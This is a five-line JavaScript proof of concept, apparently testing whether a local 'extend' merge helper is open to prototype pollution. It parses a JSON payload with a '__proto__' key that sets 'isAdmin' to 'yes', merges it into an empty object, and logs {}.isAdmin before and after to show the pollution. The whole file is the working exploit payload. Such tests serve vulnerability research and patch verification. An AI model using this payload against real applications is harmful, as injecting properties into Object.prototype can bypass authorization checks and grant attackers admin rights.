const extend = require("./extend"); 
const payload = JSON.parse('{"__proto__":{"isAdmin":"yes"}}'); 
console.log({}.isAdmin) 
extend({}, payload); 
console.log({}.isAdmin)